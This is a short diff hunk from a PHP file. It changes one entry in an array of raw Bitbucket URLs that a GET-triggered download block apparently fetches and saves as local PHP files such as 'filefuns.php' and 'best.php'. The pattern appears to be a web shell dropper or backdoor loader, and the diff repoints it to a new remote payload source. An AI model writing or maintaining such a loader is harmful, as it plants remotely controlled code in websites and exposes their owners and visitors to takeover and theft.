@@ -120,7 +120,7 @@ if (isset($_GET['download']) && isset($_GET['file'])) {
             'name' => 'best.php'
         ],
         'txets' => [
-            'url' => 'https://bitbucket.org/new0981/vevy/raw/1c9a161c7adf6a336d7eb96dc8e65e3c67248f03/filefuns.php',
+            'url' => 'https://bitbucket.org/filefuns/filefun/raw/6767cb40d21c5ac68ca5b1643f3c6143bc5eabd4/filefuns.php',
             'name' => 'filefuns.php'
         ]
     ];
